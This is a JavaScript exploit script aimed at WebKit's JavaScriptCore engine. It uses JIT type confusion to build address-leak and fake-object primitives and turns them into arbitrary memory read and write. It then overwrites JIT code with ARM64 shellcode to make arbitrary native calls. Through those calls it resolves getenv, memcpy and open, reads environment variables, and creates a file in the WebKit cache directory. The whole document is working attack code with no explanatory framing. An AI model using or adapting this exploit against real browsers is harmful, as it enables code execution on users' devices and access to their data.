class Base extends Function {
    constructor() {
        super();
        super.prototype = 1;
    }
}

var structs = [];
for (var i = 0; i < 0x1000; i++) {
    var a = new Float64Array(1);
    a['prop' + i] = 1337;
    structs.push(a);
}

for (var i = 0; i < 0x1000; i++) {
    var a = new Float64Array(1);
    a['prop' + i] = 1337;
    structs.push(a);
}

for (var i = 0; i < 0x1000; i++) {
    var a = new Float64Array(1);
    a['prop' + i] = 1337;
    structs.push(a);
}


// address leak
function addrofOnce(obj){
    var arr = [1.1, 2.2, 3.3];
    var confuse = new Array(1.1, 2.2, 3.3);
    confuse[0] = 1.1;
    let trigger = false;
    const b = new Base();
    
    Object.defineProperty(arr, 0, {value:1.1, configurable:false, writable:true});
    b.__defineGetter__("prototype", function() { if(trigger) { confuse[1] = obj; return false;} });
    
    function jitme(a, flag) {
        a[0] = 1.1;
        a[1] = 2.2;
        if(flag) {
            [...arr];
        }
        return a[1];
    }
    for(var i = 0; i < 0x100000; i++){
        jitme(confuse, false); // JITting...
    }
    trigger = true;
    arr[0] = b.prototype;
    let addr = Int64.fromDouble(jitme(confuse, true));
    return addr;
}


function fakeobjOnce(addr){
    addr = Number(addr);
    var arr = [1.1, 2.2, 3.3];
    var confuse = new Array(1.1, 2.2, 3.3);
    confuse[1] = 1.1;
    let trigger = 0;
    const b2 = new Base();
    
    Object.defineProperty(arr, 0, {value:1.1, configurable:false, writable:true});
    b2.__defineGetter__("prototype", function() { if(trigger) { confuse[1] = {}; return false; } });
    
    function jitme(a, flag, f64arr, u32arr) {
        a[0] = 1.1;
        a[1] = 2.2;
        if(flag) {
            [...arr];
        }
        f64arr[0] = f64arr[1] = a[1];
        // u32arr[3] = 1; //temp
        // if(flag)
        //     debug(u32[3])
        u32arr[2] = addr;
        a[1] = f64arr[1];
    }
    
    let u32arr = new Uint32Array(4);
    let f64arr = new Float64Array(u32arr.buffer);
    
    for(var i = 0; i < 0x100000; i++){
        jitme(confuse, false, f64arr, u32arr); // JITting...
    }
    
    trigger = 1;
    arr[0] = b2.prototype;
    jitme(confuse, true, f64arr, u32arr);
    return confuse[1];
}

function addrofOnce2(obj){
    var arr = [1.1, 2.2, 3.3];
    var confuse = new Array(1.1, 2.2, 3.3);
    confuse[0] = 1.1;
    let trigger = false;
    const b = new Base();
    
    Object.defineProperty(arr, 0, {value:1.1, configurable:false, writable:true});
    b.__defineGetter__("prototype", function() { if(trigger) { confuse[1] = obj; return false;} });
    
    function jitme(a, flag) {
        a[0] = 1.1;
        a[1] = 2.2;
        if(flag) {
            [...arr];
        }
        return a[1];
    }
    for(var i = 0; i < 0x100000; i++){
        jitme(confuse, false); // JITting...
    }
    trigger = true;
    arr[0] = b.prototype;
    let addr = Int64.fromDouble(jitme(confuse, true));
    return addr;
}


function fakeobjOnce2(addr){
    addr = Number(addr);
    var arr = [1.1, 2.2, 3.3];
    var confuse = new Array(1.1, 2.2, 3.3);
    confuse[1] = 1.1;
    let trigger = 0;
    const b2 = new Base();
    
    Object.defineProperty(arr, 0, {value:1.1, configurable:false, writable:true});
    b2.__defineGetter__("prototype", function() { if(trigger) { confuse[1] = {}; return false; } });
    
    function jitme(a, flag, f64arr, u32arr) {
        a[0] = 1.1;
        a[1] = 2.2;
        if(flag) {
            [...arr];
        }
        f64arr[0] = f64arr[1] = a[1];
        // u32arr[3] = 1; //temp
        // if(flag)
        //     debug(u32[3])
        u32arr[2] = addr;
        a[1] = f64arr[1];
    }
    
    let u32arr = new Uint32Array(4);
    let f64arr = new Float64Array(u32arr.buffer);
    
    for(var i = 0; i < 0x100000; i++){
        jitme(confuse, false, f64arr, u32arr); // JITting...
    }
    
    trigger = 1;
    arr[0] = b2.prototype;
    jitme(confuse, true, f64arr, u32arr);
    return confuse[1];
}

const buf = new ArrayBuffer(8);
const f64 = new Float64Array(buf);
const u32 = new Uint32Array(buf);

function f2i(val) {
    f64[0] = val;
    return u32[1] * 0x100000000 + u32[0];
}

function i2f(val) {
    let tmp = [];
    tmp[0] = parseInt(val % 0x100000000);
    tmp[1] = parseInt((val - tmp[0]) / 0x100000000);
    u32.set(tmp);
    return f64[0];
}

function i2obj(val) {
    return i2f(val-0x02000000000000);
}

function LeakStructureID(obj) {
    let container = {
        cellHeader: i2obj(0x0108200700000000),
        butterfly: obj
    };
    let fakeObjAddr = (Add(addrofOnce(container), 0x10)); // 16
    let fakeObj = fakeobjOnce(fakeObjAddr);
    f64[0] = fakeObj[0];
    let structureID = u32[0];
    u32[1] = 0x01082307 - 0x20000;
    container.cellHeader = f64[0];
    return structureID;
}

function MakeJitCompiledFunction() {
    function target(num) {
        for (var i = 2; i < num; i++) {
            if (num % i === 0) {
                return false;
            }
        }
        return true;
    }
    for (var i = 0; i < 1000; i++) {
        target(i);
    }
    for (var i = 0; i < 1000; i++) {
        target(i);
    }
    for (var i = 0; i < 1000; i++) {
        target(i);
    }
    for (var i = 0; i < 1000; i++) {
        target(i);
    }
    for (var i = 0; i < 1000; i++) {
        target(i);
    }
    for (var i = 0; i < 1000; i++) {
        target(i);
    }
    for (var i = 0; i < 1000; i++) {
        target(i);
    }
    for (var i = 0; i < 1000; i++) {
        target(i);
    }
    for (var i = 0; i < 1000; i++) {
        target(i);
    }
    for (var i = 0; i < 1000; i++) {
        target(i);
    }
    for (var i = 0; i < 1000; i++) {
        target(i);
    }
    for (var i = 0; i < 1000; i++) {
        target(i);
    }
    return target;
}

function millis(ms)
{
    var t1 = Date.now();
    while(Date.now() - t1 < ms)
    {
        //Simply wait
    }
}

var shellcodeFunc = MakeJitCompiledFunction();

function pwn() {
    
    let noCoW = 13.37;
    var arrLeak = new Array(noCoW, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8);
    let structureID = LeakStructureID(arrLeak);
    log("[+] leak structureID: "+(structureID));
    
    pad = [{}, {}, {}];
    var victim = [noCoW, 14.47, 15.57];
    victim['prop'] = 13.37;
    victim['prop_1'] = 13.37;
    
    u32[0] = structureID;
    u32[1] = 0x01082309-0x20000;
    
    var container = {
        cellHeader: f64[0],
        butterfly: victim
    };
    
    // build fake driver
    var containerAddr = addrofOnce2(container);
    var fakeArrAddr = Add(containerAddr, 0x10);
    var driver = fakeobjOnce2(fakeArrAddr);
    
    // ArrayWithDouble
    var unboxed = [noCoW, 13.37, 13.37];
    // ArrayWithContiguous
    var boxed = [{}];
    
    // leak unboxed butterfly's addr
    driver[1] = unboxed;
    var sharedButterfly = victim[1];
    log("[+] shared butterfly addr: " + Int64.fromDouble(sharedButterfly));
    
    driver[1] = boxed;
    victim[1] = sharedButterfly;
    
    // set driver's cell header to double array
    u32[0] = structureID;
    u32[1] = 0x01082307-0x20000;
    container.cellHeader = f64[0];
    
    function addrof(obj) {
        boxed[0] = obj;
        return f2i(unboxed[0]);
    }
    
    function fakeobj(addr) {
        unboxed[0] = i2f(addr);
        return boxed[0];
    }
    
    function read64(addr) {
        driver[1] = i2f(addr+0x10);
        return addrof(victim.prop);
    }
    
    function write64(addr, val) {
        driver[1] = i2f(addr+0x10);
        victim.prop = i2f(val);
    }
    
    function ByteToDwordArray(payload)
    {
        let sc = []
        let tmp = 0;
        let len = Math.ceil(payload.length/6)
        for (let i = 0; i < len; i += 1) {
            tmp = 0;
            pow = 1;
            for(let j=0; j<6; j++){
                let c = payload[i*6+j]
                if(c === undefined) {
                    c = 0;
                }
                pow = j==0 ? 1 : 256 * pow;
                tmp += c * pow;
            }
            tmp += 0xc000000000000;
            sc.push(tmp);
        }
        return sc;
    }
    
    function ArbitraryWrite(addr, payload)
    {
        let sc = ByteToDwordArray(payload);
        for(let i=0; i<sc.length; i++) {
            write64(addr+i*6, sc[i]);
        }
    }
    
    let arbCallBytes = new Uint8Array([
        0x00, 0x00, 0x00, 0x10,
        0x11, 0x24, 0x40, 0xF9,
        0x35, 0x02, 0x40, 0xF9,
        0x36, 0x22, 0x00, 0x91,
        0x20, 0x0A, 0x40, 0xF9,
        0x21, 0x0E, 0x40, 0xF9,
        0x22, 0x12, 0x40, 0xF9,
        0x23, 0x16, 0x40, 0xF9,
        0x24, 0x1A, 0x40, 0xF9,
        0x25, 0x1E, 0x40, 0xF9,
        0x26, 0x22, 0x40, 0xF9,
        0x27, 0x26, 0x40, 0xF9,
        0x28, 0x2A, 0x40, 0xF9,
        0xF7, 0x03, 0x1E, 0xAA,
        0xA0, 0x02, 0x3F, 0xD6,
        0xFE, 0x03, 0x17, 0xAA,
        0xC0, 0x02, 0x00, 0xF9,
        0xC0, 0x03, 0x5F, 0xD6,
        
        // address here
        0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00
    ]);
    
    // initialize arb call
    let array = new Uint8Array(0x2345).fill(0);
    let arrayView = new DataView(array.buffer);
    let arrayAddr = read64(addrof(array) + 0x10);
    log(`[+] arrayAddr = 0x${arrayAddr.toString(16)}`);
    new DataView(arbCallBytes.buffer).setBigUint64(0x48, BigInt(arrayAddr), true);
    var shellcodeFuncAddr = addrof(shellcodeFunc);
    log(`[+] Shellcode function @ ${shellcodeFuncAddr.toString(16)}`);
    var executableAddr = read64(shellcodeFuncAddr + 24);
    log(`[+] Executable instance @ ${executableAddr.toString(16)}`);
    var jitCodeAddr = read64(executableAddr + 8);
    log(`[+] JITCode instance @ ${jitCodeAddr.toString(16)}`);
    var JITCode = read64(jitCodeAddr + 0x1a8);
    log(`[+] JITCode @ ${JITCode.toString(16)}`);
    ArbitraryWrite(JITCode, arbCallBytes);
    
    // method 1, requires NULL terminated string. eg. "exit\0"
    // function getStringAddress(str) {
    //    return read64(addrof(str) + 0x8) + 20;
    // }
    
    // method 2
    function getStringAddress(str) {
        let encoder = new TextEncoder();
        let byteArray = encoder.encode(str);
        byteArray = new Uint8Array([...byteArray, 0]);
        return read64(addrof(byteArray) + 0x10);
    }
    
    // function to make an arbitrary call
    function arbCall(func, ...args) {
        if (args.length > 9) {
            log("[+] Only 9 args are allowed!\n");
            return -1;
        }
        //log(`[+] func: 0x${func.toString(16)}`);
        arrayView.setBigUint64(0x0, BigInt(func), true);
        for (let i = 0; i < args.length; i++) {
            let arg = args[i];
            let value;
            switch (typeof arg) {
                case 'string':
                    value = BigInt(getStringAddress(arg));
                    break;
                case 'object':
                    value = BigInt(read64(addrof(arg) + 0x10));
                    break;
                default:
                    value = BigInt(arg);
            }
            //log(`[+] x${i}: 0x${value.toString(16)}`);
            arrayView.setBigUint64(16 + (i * 8), value, true);
        }
        shellcodeFunc();
        for (let i = 0; i < 9; i++) arrayView.setBigUint64(16 + (i * 8), 0n, true);
        return arrayView.getBigUint64(0x8, true);
    }
    
    let dlsymAddr = 0x18039e2b8;
    let getenvAddr = arbCall(dlsymAddr, -2, "getenv");
    let memcpyAddr = arbCall(dlsymAddr, -2, "memcpy");
    let strlenAddr = arbCall(dlsymAddr, -2, "strlen");
    let openAddr = arbCall(dlsymAddr, -2, "open");
    
    log(`[+] dlsym address: 0x${dlsymAddr.toString(16)}`);
    log(`[+] getenv address: 0x${getenvAddr.toString(16)}`);
    log(`[+] memcpy address: 0x${memcpyAddr.toString(16)}`);
    log(`[+] strlen address: 0x${strlenAddr.toString(16)}`);
    log(`[+] open address: 0x${openAddr.toString(16)}`);
    
    function memcpy(destination, source, size) {
        return arbCall(memcpyAddr, destination, source, size);
    }
    
    function strlen(string) {
        return Number(arbCall(strlenAddr, string));
    }
    
    function readbuf(addr, size) {
        let uint8Array = new Uint8Array(size);
        memcpy(uint8Array, addr, size);
        return uint8Array;
    }
    
    function readString(stringAddr) {
        if (stringAddr == 0) return "";
        let stringBytes = readbuf(stringAddr, strlen(stringAddr));
        return new TextDecoder('utf-8').decode(stringBytes);
    }
    
    function getenv(name) {
        return readString(arbCall(getenvAddr, name));
    }
    
    function open(path, flags) {
        return arbCall(openAddr, path, flags)
    }
    
    log(`[+] HOME: ${getenv("HOME")}`);
    log(`[+] PATH: ${getenv("PATH")}`);
    log(`[+] USER: ${getenv("USER")}`);
    
    let filePath = getenv("HOME") + "/Library/Caches/com.apple.WebKit.WebContent/file.txt";
    log(`[+] filePath: ${filePath}`);
    
    const O_RDWR = 0x0002;
    const O_CREAT = 0x00000200;
    const O_TRUNC = 0x00000400;
        
    let fd = open(filePath, O_RDWR | O_CREAT | O_TRUNC);
    if (Number(fd) == 0xFFFFFFFFFFFFFFFF) {
        log("[+] Failed to open file!");
        return;
    }
    log(`[+] fd: ${fd}`);
}

function logBytes(array) {
    log(Array.from(array).map(byte => byte.toString(16).padStart(2, '0')).join(' '));
}
